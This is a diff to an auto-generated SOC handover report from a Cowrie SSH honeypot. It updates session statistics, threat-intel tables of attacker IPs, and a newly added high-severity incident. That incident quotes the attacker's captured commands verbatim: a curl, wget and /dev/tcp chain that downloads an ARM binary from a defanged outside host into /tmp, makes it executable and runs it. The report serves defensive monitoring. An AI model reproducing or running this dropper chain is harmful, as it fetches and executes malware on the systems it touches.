@@ -3,8 +3,8 @@
 | Field | Value |
 |---|---|
 | **Report Date** | 2026-03-14 |
-| **Generated At** | 2026-03-14T14:26:54Z |
-| **Shift Time** | 14:26 UTC |
+| **Generated At** | 2026-03-14T16:28:54Z |
+| **Shift Time** | 16:28 UTC |
 | **Honeypot Status** | ✅ HEALTHY |
 | **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |
 
@@ -14,19 +14,19 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Captured | **571** |
-| Confirmed Threats | **243** |
-| False Positives Filtered | **328** (57.4%) |
-| Unique Attacker IPs | **142** |
-| Countries of Origin | **29** |
-| High Severity Cases | **51** |
+| Total Sessions Captured | **652** |
+| Confirmed Threats | **269** |
+| False Positives Filtered | **383** (58.7%) |
+| Unique Attacker IPs | **165** |
+| Countries of Origin | **30** |
+| High Severity Cases | **58** |
 | Medium Severity Cases | **0** |
-| Low Severity Cases | **520** |
+| Low Severity Cases | **594** |
 | Malware Samples Analyzed | **0** HIGH · **1** MED · 0 empty upload attempt(s) |
 
 ---
 
-## 🚨 Priority Cases — Immediate Attention (40)
+## 🚨 Priority Cases — Immediate Attention (41)
 
 > Cases with auth success, command execution, or file downloads.
 > Each requires individual review. Never grouped.
@@ -1433,6 +1433,42 @@
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
+### 🔴 HIGH · IR-af63309b814c
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `101.200.132[.]92` |
+| **First Seen** | 2026-03-14 16:22 |
+| **Last Seen** | 2026-03-14 16:22 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://124.225.122[.]159:60128/arm_linux -o /tmp/8ARyxUXeZb; if [ ! -f /tmp/8ARyxUXeZb ]; then wget hxxp://124.225.122[.]159:60128/arm_linux -O /tmp/8ARyxUXeZb; fi; if [ ! -f /tmp/8ARyxUXeZb ]; then exec 6<>/dev/tcp/124.225.122[.]159/60128 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/8ARyxUXeZb ; chmod +x /tmp/8ARyxUXeZb && /tmp/8ARyxUXeZb j3tj5M+6eXyGMZp+YrHY6WFr8/Jrd+vPun56hjGffGK51ONtbfLzambz1b9ieZoyhnl9u8/iZWH08mpn6sG8f2aZMJhmf7rP4W9h9PJqZODBvHtmkDOGeny7z+JvaPj0a2bg2ah9epwumnp5ptDh, head -c 2639612 > /tmp/hN6eqN07mL, nohup $SHELL -c "curl hxxp://124.225.122[.]159:60128/arm_linux -o /tmp/8ARyxUXeZb; if [ ! -f /tmp/8ARyxUXeZb ]; then wget hxxp://124.225.122[.]159:60128/arm_linux -O /tmp/8ARyxUXeZb; fi; if [ ! -f /tmp/8ARyxUXeZb ]; then exec 6<>/dev/tcp/124.225.122[.]159/60128 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/8ARyxUXeZb ; chmod +x /tmp/8ARyxUXeZb && /tmp/8ARyxUXeZb j3tj5M+6eXyGMZp+YrHY6WFr8/Jrd+vPun56hjGffGK51ONtbfLzambz1b9ieZoyhnl9u8/iZWH08mpn6sG8f2aZMJhmf7rP4W9h9PJqZODBvHtmkDOGeny7z+JvaPj0a2bg2ah9epwumnp5ptDh, (vXZXELF` |
+| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-03-14 16:22:45` | `cowrie.session.connect` |
+| `2026-03-14 16:22:45` | `cowrie.client.version` |
+| `2026-03-14 16:22:45` | `cowrie.client.kex` |
+| `2026-03-14 16:22:46` | `cowrie.login.success` |
+| `2026-03-14 16:22:46` | `cowrie.session.params` |
+| `2026-03-14 16:22:46` | `cowrie.command.input` |
+| `2026-03-14 16:22:49` | `cowrie.command.input` |
+| `2026-03-14 16:22:49` | `cowrie.command.input` |
+| `2026-03-14 16:22:49` | `cowrie.command.input` |
+| `2026-03-14 16:22:49` | `cowrie.command.input` |
+| `2026-03-14 16:22:49` | `cowrie.log.closed` |
+| `2026-03-14 16:22:49` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `101.200.132[.]92` to AbuseIPDB if not already reported
+- [ ] Block `101.200.132[.]92` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
 ---
 
 ## 📡 Reconnaissance Activity — Grouped by Source IP
@@ -1449,12 +1485,15 @@
 | `172.174.72[.]225` | **10** | 2026-03-14 09:49 | 2026-03-14 10:09 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
 | `179.33.186[.]150` | **10** | 2026-03-14 05:51 | 2026-03-14 06:15 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
 | `197.243.0[.]62` | **10** | 2026-03-14 09:07 | 2026-03-14 09:34 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
+| `8.219.57[.]123` | **10** | 2026-03-14 15:02 | 2026-03-14 15:20 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
 | `120.48.181[.]192` | **9** | 2026-03-14 11:16 | 2026-03-14 11:26 | 10m | 3 | `T1110.001 · T1592` | 🟢 LOW |
 | `118.193.37[.]79` | **8** | 2026-03-14 10:57 | 2026-03-14 11:27 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
+| `120.48.11[.]36` | **7** | 2026-03-14 15:07 | 2026-03-14 15:12 | 4m | 2 | `T1110.001 · T1592` | 🟢 LOW |
 | `16.58.56[.]214` | **5** | 2026-03-14 03:21 | 2026-03-14 03:26 | 0m | 0 | `T1592` | 🟢 LOW |
 | `183.220.237[.]230` | **4** | 2026-03-14 02:58 | 2026-03-14 02:58 | 4m | 0 | `T1592` | 🟢 LOW |
 | `68.183.86[.]77` | **3** | 2026-03-14 08:46 | 2026-03-14 08:52 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
 | `8.211.52[.]151` | **3** | 2026-03-14 03:34 | 2026-03-14 03:34 | 0m | 2 | `T1110.001` | 🟢 LOW |
+| `113.194.203[.]31` | **2** | 2026-03-14 14:49 | 2026-03-14 15:05 | 4m | 0 | `T1592` | 🟢 LOW |
 | `134.199.151[.]94` | **2** | 2026-03-14 07:32 | 2026-03-14 07:33 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
 | `172.203.245[.]82` | **2** | 2026-03-14 10:35 | 2026-03-14 10:35 | 0m | 0 | `T1592` | 🟢 LOW |
 | `183.220.237[.]230` | **2** | 2026-03-14 13:28 | 2026-03-14 13:28 | 0m | 0 | `T1592` | 🟢 LOW |
@@ -1462,6 +1501,7 @@
 | `20.65.195[.]96` | **2** | 2026-03-14 05:13 | 2026-03-14 05:14 | 0m | 0 | `T1592` | 🟢 LOW |
 | `47.250.181[.]211` | **2** | 2026-03-14 12:40 | 2026-03-14 12:40 | 0m | 0 | `T1592` | 🟢 LOW |
 | `101.200.236[.]207` | 1 | 2026-03-14 03:39 | 2026-03-14 03:39 | 13s | 0 | `T1592` | 🟢 LOW |
+| `102.33.36[.]254` | 1 | 2026-03-14 16:00 | 2026-03-14 16:00 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
 | `102.38.3[.]181` | 1 | 2026-03-14 01:52 | 2026-03-14 01:52 | 1s | 0 | `T1592` | 🟢 LOW |
 | `102.38.3[.]181` | 1 | 2026-03-14 06:59 | 2026-03-14 06:59 | 7s | 0 | `T1592` | 🟢 LOW |
 | `106.13.181[.]3` | 1 | 2026-03-14 14:03 | 2026-03-14 14:05 | 120s | 0 | `T1592` | 🟢 LOW |
@@ -1476,6 +1516,7 @@
 | `118.122.255[.]5` | 1 | 2026-03-14 10:12 | 2026-03-14 10:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
 | `118.43.231[.]252` | 1 | 2026-03-14 02:31 | 2026-03-14 02:31 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
 | `120.48.109[.]59` | 1 | 2026-03-14 06:01 | 2026-03-14 06:03 | 120s | 0 | `T1592` | 🟢 LOW |
+| `120.48.131[.]211` | 1 | 2026-03-14 14:45 | 2026-03-14 14:47 | 120s | 0 | `T1592` | 🟢 LOW |
 | `120.48.151[.]153` | 1 | 2026-03-14 01:03 | 2026-03-14 01:05 | 120s | 0 | `T1592` | 🟢 LOW |
 | `120.48.154[.]88` | 1 | 2026-03-14 01:06 | 2026-03-14 01:08 | 120s | 0 | `T1592` | 🟢 LOW |
 | `122.254.1[.]68` | 1 | 2026-03-14 12:18 | 2026-03-14 12:19 | 30s | 0 | `T1592` | 🟢 LOW |
@@ -1494,10 +1535,12 @@
 | `180.188.253[.]150` | 1 | 2026-03-14 14:14 | 2026-03-14 14:14 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
 | `180.76.97[.]132` | 1 | 2026-03-14 07:45 | 2026-03-14 07:47 | 120s | 0 | `T1592` | 🟢 LOW |
 | `183.171.12[.]224` | 1 | 2026-03-14 09:39 | 2026-03-14 09:41 | 120s | 0 | `T1592` | 🟢 LOW |
+| `183.171.144[.]219` | 1 | 2026-03-14 14:29 | 2026-03-14 14:29 | 9s | 0 | `T1592` | 🟢 LOW |
 | `183.171.148[.]171` | 1 | 2026-03-14 08:09 | 2026-03-14 08:09 | 10s | 0 | `T1592` | 🟢 LOW |
 | `183.171.148[.]79` | 1 | 2026-03-14 03:31 | 2026-03-14 03:31 | 19s | 0 | `T1592` | 🟢 LOW |
 | `183.171.4[.]155` | 1 | 2026-03-14 03:48 | 2026-03-14 03:48 | 12s | 0 | `T1592` | 🟢 LOW |
 | `183.171.44[.]82` | 1 | 2026-03-14 08:22 | 2026-03-14 08:22 | 0s | 0 | `T1592` | 🟢 LOW |
+| `183.171.61[.]139` | 1 | 2026-03-14 15:22 | 2026-03-14 15:24 | 120s | 0 | `T1592` | 🟢 LOW |
 | `183.220.227[.]73` | 1 | 2026-03-14 05:21 | 2026-03-14 05:21 | 0s | 0 | `T1592` | 🟢 LOW |
 | `183.237.33[.]162` | 1 | 2026-03-14 02:11 | 2026-03-14 02:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
 | `183.56.179[.]201` | 1 | 2026-03-14 00:01 | 2026-03-14 00:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
@@ -1505,6 +1548,7 @@
 | `211.20.26[.]201` | 1 | 2026-03-14 14:22 | 2026-03-14 14:22 | 14s | 0 | `T1592` | 🟢 LOW |
 | `216.236.215[.]9` | 1 | 2026-03-14 13:24 | 2026-03-14 13:24 | 20s | 0 | `T1592` | 🟢 LOW |
 | `220.249.186[.]9` | 1 | 2026-03-14 12:09 | 2026-03-14 12:11 | 120s | 0 | `T1592` | 🟢 LOW |
+| `221.124.61[.]177` | 1 | 2026-03-14 14:53 | 2026-03-14 14:53 | 5s | 0 | `T1592` | 🟢 LOW |
 | `223.48.1[.]189` | 1 | 2026-03-14 13:31 | 2026-03-14 13:31 | 31s | 0 | `T1592` | 🟢 LOW |
 | `3.81.224[.]7` | 1 | 2026-03-14 12:55 | 2026-03-14 12:55 | 1s | 0 | `T1592` | 🟢 LOW |
 | `45.239.202[.]205` | 1 | 2026-03-14 08:39 | 2026-03-14 08:39 | 31s | 0 | `T1592` | 🟢 LOW |
@@ -1517,6 +1561,7 @@
 | `8.219.165[.]42` | 1 | 2026-03-14 09:49 | 2026-03-14 09:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
 | `8.222.159[.]179` | 1 | 2026-03-14 05:41 | 2026-03-14 05:42 | 30s | 0 | `T1592` | 🟢 LOW |
 | `89.107.98[.]108` | 1 | 2026-03-14 13:40 | 2026-03-14 13:40 | 13s | 0 | `T1592` | 🟢 LOW |
+| `92.203.165[.]140` | 1 | 2026-03-14 16:03 | 2026-03-14 16:05 | 120s | 0 | `T1592` | 🟢 LOW |
 
 ---
 
@@ -1534,16 +1579,16 @@
 
 | IP | Country | ISP | Abuse Score | OTX Pulses |
 |---|---|---|---|---|
-| `128.24.162[.]1` | US | Microsoft Limited | **100** ⚠️ | 7 |
-| `179.181.133[.]153` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 25 |
-| `106.246.89[.]72` | KR | LG DACOM Corporation | **100** ⚠️ | 18 |
-| `213.124.221[.]2` | NL | Ziggo B2B NL | **100** ⚠️ | 33 |
-| `183.220.237[.]230` | CN | China Mobile Communications Corporation | **100** ⚠️ | 28 |
-| `183.171.4[.]155` | MY | Celcom Axiata Berhad | **100** ⚠️ | 14 |
-| `120.48.109[.]59` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 9 |
+| `183.171.12[.]224` | MY | Celcom Axiata Berhad | **100** ⚠️ | 10 |
+| `59.92.51[.]186` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 19 |
 | `8.219.165[.]42` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 17 |
-| `211.20.26[.]201` | TW | Data Communication Business Group, | **100** ⚠️ | 13 |
-| `172.174.72[.]225` | US | Microsoft Limited | **100** ⚠️ | 50 |
+| `68.183.86[.]77` | IN | DigitalOcean, LLC | **100** ⚠️ | 0 |
+| `153.246.198[.]45` | JP | Open Computer Network | **100** ⚠️ | 30 |
+| `179.33.186[.]150` | CO | COLOMBIA TELECOMUNICACIONES S.A. ESP | **100** ⚠️ | 19 |
+| `220.249.186[.]9` | CN | FJFZ-JiaYunWangWeiTech-Corp | **100** ⚠️ | 12 |
+| `183.237.33[.]162` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
+| `180.166.162[.]78` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 32 |
+| `78.154.211[.]39` | KW | Qualitynet Co. | **100** ⚠️ | 4 |
 
 ---
 
@@ -1559,21 +1604,22 @@
 
 ---
 
-## 🔕 False Positive Summary (328 filtered)
+## 🔕 False Positive Summary (383 filtered)
 
 | Reason | Count |
 |---|---|
-| AbuseIPDB score 0 below threshold 25 | 40 |
+| AbuseIPDB score 0 below threshold 25 | 50 |
 | AbuseIPDB score 12 below threshold 25 | 134 |
 | AbuseIPDB score 14 below threshold 25 | 8 |
 | AbuseIPDB score 15 below threshold 25 | 1 |
 | AbuseIPDB score 16 below threshold 25 | 3 |
+| AbuseIPDB score 18 below threshold 25 | 1 |
 | AbuseIPDB score 22 below threshold 25 | 1 |
-| AbuseIPDB score 24 below threshold 25 | 4 |
+| AbuseIPDB score 24 below threshold 25 | 5 |
 | AbuseIPDB score 4 below threshold 25 | 1 |
-| AbuseIPDB score 5 below threshold 25 | 22 |
+| AbuseIPDB score 5 below threshold 25 | 48 |
 | AbuseIPDB score 9 below threshold 25 | 1 |
-| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 113 |
+| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 130 |
 
 > FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.
 
@@ -1584,14 +1630,14 @@
 | Tool | Role | Status |
 |---|---|---|
 | Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
-| Tool 26 | Incident Timeline Generator | ✅ 571 session(s) |
-| Tool 27 | Threat Intel Feeder         | ✅ 142 IP(s) enriched |
-| Tool 29 | False Positive Tracker      | ✅ 328 filtered (57.4%) |
+| Tool 26 | Incident Timeline Generator | ✅ 652 session(s) |
+| Tool 27 | Threat Intel Feeder         | ✅ 165 IP(s) enriched |
+| Tool 29 | False Positive Tracker      | ✅ 383 filtered (58.7%) |
 | Tool 30 | Metric Exporter             | ✅ stats.json written |
 | Tool 31 | Malware Analyzer            | ✅ 3 file(s) analyzed |
 | Tool 28 | SOC Handover Report         | ✅ This report |
 
-> **Report grouping:** 40 priority case(s) shown individually · 75 recon entry/entries in table (19 group(s) consolidating 147 session(s)).
+> **Report grouping:** 41 priority case(s) shown individually · 84 recon entry/entries in table (22 group(s) consolidating 166 session(s)).
 
 ---
 
@@ -1607,4 +1653,4 @@
 
 _Generated by THIR · Tool 28 v2.1 · SOC Handover Report Generator_  
 _Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
-_Report time: 2026-03-14T14:26:54Z_
+_Report time: 2026-03-14T16:28:54Z_
